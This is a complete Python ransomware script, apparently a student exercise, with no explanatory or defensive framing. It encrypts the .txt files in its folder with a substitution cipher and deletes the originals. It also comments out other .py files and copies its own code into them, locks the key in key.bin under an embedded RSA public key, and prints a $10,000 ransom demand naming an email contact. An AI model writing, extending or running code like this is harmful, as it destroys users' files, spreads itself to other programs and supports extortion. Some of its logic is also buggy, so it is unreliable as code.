#!/usr/bin/env python3
import os
import sys
import glob
import string
import random
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

letters = string.ascii_letters

def generateKey():
	# Get a list from the LETTERS string.
	key = list(letters)
	# Randomly shuffle the list.
	random.shuffle(key)
	return ''.join(key)
	
def encryptMessage(plaintext, key, letters):
    keyMap = dict(zip(letters, key))
    return ''.join(keyMap.get(p, p) for p in plaintext)


def ransomText():
	print("\nYour text files are encrypted. \nTo decrypt them, you need to pay me $10,000 and send key.bin in your folder to jtai004@mymail.sim.edu.sg.\n")

# Splitting .txt files and .py files into variables
textFiles = glob.glob('*.txt')
pythonFiles = glob.glob('*.py')

cipherKey = generateKey()

# Opening each .txt files in folder
for dataFile in textFiles:
	extension = os.path.splitext(dataFile)[0]
	fileExtension = '.enc'
	newFile = extension + fileExtension
	# Opening in readonly mode
	with open(dataFile, 'r') as textfile, open(newFile, 'w') as newfile:
		for line in textfile:
			# Encrypting the file using substitution cipher
			cipher_txt = encryptMessage(line, cipherKey, letters)
			newfile.write(cipher_txt)

			try:
				# Deleting .txt file
				os.unlink(textfile.name)
			except OSError:
				pass 

		# End of file
		if 'str' in line:
			break
			
virusCode = []

# Opening each .py files in folder
for pyFiles in pythonFiles:
	if pyFiles != "ransomware.py":
		# Opening in readonly mode
		with open(pyFiles) as fp:
			lines = fp.read().splitlines()
		# Commenting each line
		with open(pyFiles, "w") as fp:
			for line in lines:
        			print("#" + line, file=fp)
		
		# Reading .py files in readonly mode
		with open(pyFiles, 'r') as pythonFile:
			pyLines = pythonFile.readlines()
			
			self_replicating_part = False
			for line in pyLines:
				if not self_replicating_part:
					virusCode.append(line)
		
		# Reading virus file
		with open('ransomware.py', 'r') as virusFile:
			fileCode = virusFile.readlines()

		infected = False

		# Replicating virus onto .py files
		for line in fileCode:
			if line == "# THIS FILE IS INFECTED":
				infected = True
				break
			if not infected:
				finalCode = []
				finalCode.extend(virusCode)
				finalCode.extend("\n")
				finalCode.extend(fileCode)
				
				# Replicating virus onto .py files
				with open(pyFiles, 'w') as replicateFile:
					replicateFile.writelines(finalCode)
		
# public key
publickey = '''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3bpo9ISWuZe17myYUcfY
EYGfAXHzi2zsr7mRWXLZf5/CpV1Pk4E/vD2bIZcJ9UlfqFRcPgkhKsnciUW5FqC5
ifJh9RpQg1b88+KA28GPBhP6P0CyypVc+CVvLdJI02SRVpWEaHQE5915W8NrBFy+
1Ss29MMKoQyfAgOajTG6g2kwtF1y/NdRbI4KXX+vX2aB2uhKdYVB+Tb3WBgY/a96
M+RyPkZdR/Jo3Y6kDLI783dNXiEx5Qka9+qBAovqt/DAnkB9CQGryBG/PfGHgEyy
O5RGBYMMM67xzqpA82u+i6wmLpfeGPSHTiQt6K7NWMU7FIpgqQMYHAJ8tbmf97l0
YQIDAQAB
-----END PUBLIC KEY-----'''

# Creating key.bin
recipient_key = RSA.import_key(publickey)
data = cipherKey.encode('utf-8')
file_out = open("key.bin", "wb")
cipher_rsa = PKCS1_OAEP.new(recipient_key)
enc_data = cipher_rsa.encrypt(data)
file_out.write(enc_data)
file_out.close()

ransomText()
